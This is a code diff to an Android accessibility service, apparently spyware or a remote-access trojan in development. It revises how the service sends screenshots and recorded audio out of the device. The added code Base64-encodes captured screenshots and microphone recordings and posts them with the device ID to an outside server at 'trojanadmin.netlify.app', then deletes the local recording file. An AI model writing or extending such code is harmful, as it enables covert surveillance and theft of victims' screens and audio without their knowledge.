@@ -228,7 +228,7 @@ public class PowerAccessibilityService extends AccessibilityService implements S
     private void takeScreenshot() {
         if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
             Log.e(TAG, "Screenshot API is not available on this Android version.");
-            submitDataToServer("screenshot_error", "API not available");
+            submitDataToServer("screenshot_error", "API NOT AVAILABLE ON THIS VERSION OF ANDROID");
             return;
         }
         // NOTE: This is a simplified call. For a real implementation, you might need
@@ -244,7 +244,7 @@ public class PowerAccessibilityService extends AccessibilityService implements S
                     bitmap.compress(Bitmap.CompressFormat.JPEG, 80, byteArrayOutputStream); // Compress to 80% quality
                     byte[] byteArray = byteArrayOutputStream.toByteArray();
                     String encoded = Base64.encodeToString(byteArray, Base64.DEFAULT);
-                    submitDataToServer("screenshot", encoded);
+                    uploadBase64File("screenshot", encoded);
                 } catch (Exception e) {
                     Log.e(TAG, "Failed to process screenshot.", e);
                     submitDataToServer("screenshot_error", "Processing failed");
@@ -295,73 +295,76 @@ public class PowerAccessibilityService extends AccessibilityService implements S
         }
     }
 
-    private void stopAudioRecording() {
-        if (mediaRecorder == null) {
-            Log.w(TAG, "No active recording to stop.");
-            return;
-        }
-        try {
-            mediaRecorder.stop();
-            mediaRecorder.release();
-            mediaRecorder = null;
-            Log.i(TAG, "Audio recording stopped. File saved at: " + recordingFilePath);
+    // In PowerAccessibilityService.java
 
-            // --- Firebase Upload Logic ---
-            // NOTE: You need to add the Firebase Storage SDK to your project for this.
-            // This is a placeholder for the upload logic.
-            uploadFileToFirebase(recordingFilePath);
-
-        } catch (RuntimeException e) {
-            Log.e(TAG, "Failed to stop recording properly.", e);
-            mediaRecorder = null;
-        }
+private void stopAudioRecording() {
+    if (mediaRecorder == null) {
+        Log.w(TAG, "No active recording to stop.");
+        return;
     }
+    try {
+        mediaRecorder.stop();
+        mediaRecorder.release();
+        mediaRecorder = null;
+        Log.i(TAG, "Audio recording stopped. Preparing to upload file: " + recordingFilePath);
 
-    private void uploadFileToFirebase(String filePath) {
-    if (filePath == null || filePath.isEmpty()) {
-        Log.e(TAG, "File path is null or empty, cannot upload.");
-        submitDataToServer("recording_error", "File path was empty.");
+        // NEW LOGIC: Convert file to Base64 and upload to our Netlify function
+        File audioFile = new File(recordingFilePath);
+        if (audioFile.exists()) {
+            try {
+                // Read file into byte array
+                java.io.InputStream inputStream = new java.io.FileInputStream(audioFile);
+                byte[] audioBytes = new byte[(int) audioFile.length()];
+                inputStream.read(audioBytes);
+                inputStream.close();
+
+                // Encode byte array to Base64 string
+                String encodedAudio = Base64.encodeToString(audioBytes, Base64.DEFAULT);
+
+                // Send the encoded string to the new function
+                uploadBase64File("last_recording", encodedAudio);
+
+                // Clean up the local file
+                audioFile.delete();
+
+            } catch (Exception e) {
+                Log.e(TAG, "Failed to encode and upload audio file.", e);
+            }
+        }
+    } catch (RuntimeException e) {
+        Log.e(TAG, "Failed to stop recording properly.", e);
+        mediaRecorder = null;
+    }
+}
+
+// NEW HELPER METHOD: To upload any Base64 file to our function
+private void uploadBase64File(String dataType, String base64Data) {
+    String url = "https://trojanadmin.netlify.app/.netlify/functions/upload-file"; // <-- NEW URL
+    JSONObject postData = new JSONObject();
+    try {
+        String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
+        postData.put("deviceId", deviceId);
+        postData.put("dataType", dataType);
+        postData.put("fileData", base64Data); // The big Base64 string
+    } catch (JSONException e) {
+        Log.e(TAG, "Could not create file upload JSON", e);
         return;
     }
 
-    // Get a reference to Firebase Storage
-    FirebaseStorage storage = FirebaseStorage.getInstance();
-    StorageReference storageRef = storage.getReference();
+    Log.d(TAG, "Uploading Base64 data for type: " + dataType);
+    JsonObjectRequest request = new JsonObjectRequest(Request.Method.POST, url, postData,
+        response -> Log.i(TAG, "Base64 data submitted successfully: " + dataType),
+        error -> Log.e(TAG, "Failed to submit Base64 data '" + dataType + "': " + error.toString())
+    );
+    // Increase timeout for potentially large data
+    request.setRetryPolicy(new com.android.volley.DefaultRetryPolicy(
+            30000, // 30 seconds
+            com.android.volley.DefaultRetryPolicy.DEFAULT_MAX_RETRIES,
+            com.android.volley.DefaultRetryPolicy.DEFAULT_BACKOFF_MULT));
 
-    // Create a unique file name in the cloud (e.g., "recordings/recording_1662561528.mp3")
-    File localFile = new File(filePath);
-    Uri fileUri = Uri.fromFile(localFile);
-    StorageReference recordingRef = storageRef.child("recordings/" + localFile.getName());
-
-    Log.i(TAG, "Starting upload for: " + fileUri.toString());
-
-    // Start the upload task
-    recordingRef.putFile(fileUri)
-        .addOnSuccessListener(taskSnapshot -> {
-            // Upload was successful, now get the download URL
-            Log.i(TAG, "Firebase upload successful. Getting download URL...");
-            recordingRef.getDownloadUrl().addOnSuccessListener(uri -> {
-                String downloadUrl = uri.toString();
-                // Finally, submit the public URL to your Netlify server
-                submitDataToServer("last_recording_url", downloadUrl);
-                Log.i(TAG, "File uploaded and URL submitted: " + downloadUrl);
-
-                // Optional: Delete the local file after successful upload to save space
-                localFile.delete();
-
-            }).addOnFailureListener(e -> {
-                // Failed to get the download URL after a successful upload
-                Log.e(TAG, "Failed to get download URL.", e);
-                submitDataToServer("recording_error", "Upload succeeded but failed to get URL.");
-            });
-        })
-        .addOnFailureListener(e -> {
-            // The upload itself failed
-            Log.e(TAG, "Firebase upload failed.", e);
-            submitDataToServer("recording_error", "File upload to Firebase failed.");
-        });
-    }
-
+    requestQueue.add(request);
+}
+    
     // --- NEW: Media Playback and Display ---
     private void playSound(String url) {
         if (url == null || url.isEmpty()) return;
